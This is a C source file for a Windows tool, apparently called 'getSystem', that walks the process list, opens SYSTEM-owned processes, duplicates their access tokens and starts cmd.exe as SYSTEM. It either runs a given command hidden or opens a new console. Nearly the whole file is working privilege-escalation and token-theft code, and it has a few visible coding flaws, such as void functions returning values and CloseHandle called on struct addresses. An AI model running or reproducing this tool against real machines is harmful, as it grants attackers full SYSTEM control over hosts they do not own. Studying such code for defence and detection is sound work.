#define _CRT_SECURE_NO_WARNINGS
#include "getsystem.h"
#include "EnablePriv.h"



int main(int argc, char* argv[])
{
	printf("[+] getSystem Modify by Uknow\n");
	if (argc != 2)
	{
		printf("[+] usage: getSystem command \n");
		printf("[+] eg: getSystem \"whoami /all\" \n");
		printf("[+] eg: getSystem -console \n");
		return -1;
	}


	if (strcmp(argv[1], "-console") == 0) {

		console = TRUE;
	}

	process* head, * position = NULL;
	PROCESSENTRY32 each_process, entry;
	HANDLE snapshot_proc;
	BOOL first_result, system_process;
	protected_process protected_arr[MAX_ARRAY];
	int protected_count = 0;


	snapshot_proc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot_proc == INVALID_HANDLE_VALUE) {
		printf("[!] Error: Could not return handle on snapshot");
		exit(1);
	}

	each_process.dwSize = sizeof(PROCESSENTRY32);
	first_result = Process32First(snapshot_proc, &each_process);
	if (!first_result) {
		printf("[!] Error: Could not grab first process");
		exit(1);
	}


	process* new_entry = (process*)malloc(sizeof(process));
	if (new_entry == NULL) {
		printf("[!] Could not assign new entry on heap!");
		exit(1);
	}

	
	new_entry->pprocess = each_process;
	new_entry->next = NULL;
	head = new_entry;

	system_process = system_check(each_process);
	if (system_process) {
		if (console)
		{
			int protection_result = protected_check_console(each_process.th32ProcessID);
			if (protection_result) {
				protected_arr[protected_count].pprotected = each_process; //added protected processes to array for future use
				protected_count += 1;
			}
		}
		else {

			int protection_result = protected_check(each_process.th32ProcessID, argv[1]);
			if (protection_result) {
				protected_arr[protected_count].pprotected = each_process; //added protected processes to array for future use
				protected_count += 1;
			}
		}


	}

	while (Process32Next(snapshot_proc, &each_process)) {
		position = head;
		while (position->next != NULL)
			position = position->next;
		process* next_entry = (process*)malloc(sizeof(process));
		if (new_entry == NULL) {
			printf("[!] Could not assign new entry on heap!");
			exit(1);
		}
		next_entry->pprocess = each_process;
		next_entry->next = NULL;
		position->next = next_entry;

		//after finding the System process once we ignore the system_check function going forward
		if (!system_check_flag) {
			system_process = system_check(each_process);
			if (!system_process)
				continue;
		}
		if (!console) {
			int protection_result = protected_check(each_process.th32ProcessID, argv[1]);
		}
		int protection_result = protected_check_console(each_process.th32ProcessID);
		if (protection_result) {
			if (protected_count != MAX_ARRAY) {
				protected_arr[protected_count].pprotected = each_process;
				protected_count += 1;
			}
		}

	}
	CloseHandle(snapshot_proc);
}

int protected_check(DWORD pid, char* cmd) {
	HANDLE proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (proc_handle == NULL) {
		HANDLE proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid); //required for protected processes
		token_elevation(proc_handle, cmd);
		return 1;
	}
	token_elevation(proc_handle, cmd);
	return 0;
}



int protected_check_console(DWORD pid) {
	HANDLE proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (proc_handle == NULL) {
		HANDLE proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid); //required for protected processes
		token_elevation_console(proc_handle);
		return 1;
	}
	token_elevation_console(proc_handle);
	return 0;
}


void token_elevation(HANDLE process, char* cmd) {
	wchar_t wtext[512];
	mbstowcs(wtext, cmd, strlen(cmd) + 1);//Plus null
	LPWSTR ptr = wtext;
	WCHAR n[1024] = L"/c ";
	_tcscat_s(n, 512, ptr);
	TCHAR account_name[NAME_ARRAY], domain_name[NAME_ARRAY];
	HANDLE ptoken, new_token;
	STARTUPINFO startupinfo = { 0 };
	PROCESS_INFORMATION procinfo = { 0 };
	BOOL user_check, owner_check, duplicated;
	SECURITY_ATTRIBUTES sa = { 0 };
	HANDLE hRead, hWrite;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = 1;
	BOOL flag = CreatePipe(&hRead, &hWrite, &sa, 1024);
	startupinfo.hStdError = hWrite;
	startupinfo.hStdOutput = hWrite;
	startupinfo.lpDesktop = L"WinSta0\\Default";
	startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startupinfo.wShowWindow = SW_HIDE;
	HANDLE hReadThread = CreateThread(NULL, 0, ThreadProc, hRead, 0, NULL);
	HANDLE hPrimary;
	BOOL result = OpenProcessToken(process, MAXIMUM_ALLOWED, &ptoken); //
	if (!result) {
		//printf("[!] Error: Could not open handle to token\n");
		return 1;
	}

	user_check = GetUserInfo(ptoken, account_name, domain_name);
	owner_check = GetOwnerInfo(ptoken, account_name, domain_name);

	if (user_check & owner_check) {
		result = DuplicateTokenEx(ptoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &new_token);
		if (result) {
			printf("[+] Token Duplicated\n");
			duplicated = CreateProcessWithTokenW(new_token, 0, L"C:\\Windows\\System32\\cmd.exe", n, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &procinfo);
			if (duplicated) {
				if (flag) {
					printf("[+] CreatePipe success\n");
				}
				printf("[+] Command : \"c:\\Windows\\System32\\cmd.exe\" \"%S\"\n", n);
				printf("[+] Process with pid: %d created.\n==============================\n\n", procinfo.dwProcessId);
				fflush(stdout);
				WaitForSingleObject(procinfo.hProcess, -1);
				TerminateThread(hReadThread, 0);
				CloseHandle(&startupinfo);
				CloseHandle(&procinfo);
				exit(1);
			}
			else
			{
				printf("[!] FAIL");
			}
		}
	}
}



void token_elevation_console(HANDLE process) {
	TCHAR account_name[NAME_ARRAY], domain_name[NAME_ARRAY];
	HANDLE ptoken, new_token;
	STARTUPINFO startupinfo = { 0 };
	PROCESS_INFORMATION procinfo = { 0 };
	BOOL user_check, owner_check, duplicated;

	BOOL result = OpenProcessToken(process, MAXIMUM_ALLOWED, &ptoken); //
	if (!result) {
		//printf("[!] Error: Could not open handle to token\n");
		return 1;
	}

	user_check = GetUserInfo(ptoken, account_name, domain_name);
	owner_check = GetOwnerInfo(ptoken, account_name, domain_name);

	if (user_check & owner_check) {
		result = DuplicateTokenEx(ptoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &new_token);
		if (result) {
			printf("[+] Token Duplicated\n");
			duplicated = CreateProcessWithTokenW(new_token, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startupinfo, &procinfo);
			if (duplicated) {
				printf("[+] SUCCESS");
				CloseHandle(&startupinfo);
				CloseHandle(&procinfo);
				exit(1);
			}
			else
			{
				printf("[!] FAIL");
			}
		}
	}
}